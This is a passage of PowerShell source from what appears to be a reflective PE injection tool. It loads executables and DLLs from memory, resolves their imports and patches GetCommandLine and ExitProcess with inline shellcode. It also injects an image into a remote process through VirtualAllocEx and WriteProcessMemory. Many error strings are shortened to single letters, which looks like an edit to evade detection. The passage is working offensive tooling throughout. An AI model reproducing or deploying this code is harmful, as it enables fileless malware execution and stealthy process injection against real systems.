				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)

				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}

				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
					$ProcedureName = ''
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([Int64]$OriginalThunkRefVal -lt 0)
					{
						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					}

					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
					}
					else
					{
						if($ProcedureName -is [string])
						{
						    [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
						}
						else
						{
						    [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressOrdinal.Invoke($ImportDllHandle, $ProcedureName)
						}
					}

					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)

					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)

		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}

		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}

		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)

			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize

			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "U"
			}
		}
	}

	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,

		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)

		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @()

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0

		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "K"
		}

		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "K"
		}

		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)

		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "G"
		}


		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48
		}
		$Shellcode1 += 0xb8

		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length

		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)


		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "C"
		}

		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp

		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null


		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}

		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp

		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}

				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)

				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)

				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "C"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null

				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process

		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "m"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "C"
		}
		$ExitFunctions += $CorExitProcessAddr

		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr

		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)

			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length

			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}


			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)


			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}

		Write-Output $ReturnArray
	}



	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}

			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null

			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}

	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,

		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)

		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants


		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)

		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{

			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{

				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}

		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,

		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types

		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}


		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "P" -WarningAction Continue
			$NXCompatible = $false
		}


		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "C"
			}

			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}

			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}

			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "P"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "P"
		}



		[IntPtr]$LoadAddr = [IntPtr]::Zero
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "P" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}

		$PEHandle = [IntPtr]::Zero
		$EffectivePEHandle = [IntPtr]::Zero
		if ($RemoteLoading -eq $true)
		{
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}

		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{
			Throw "V"
		}
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"

		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}


		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{

				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{

			}
		}
		else
		{

		}

		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "U"
			}
		}
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
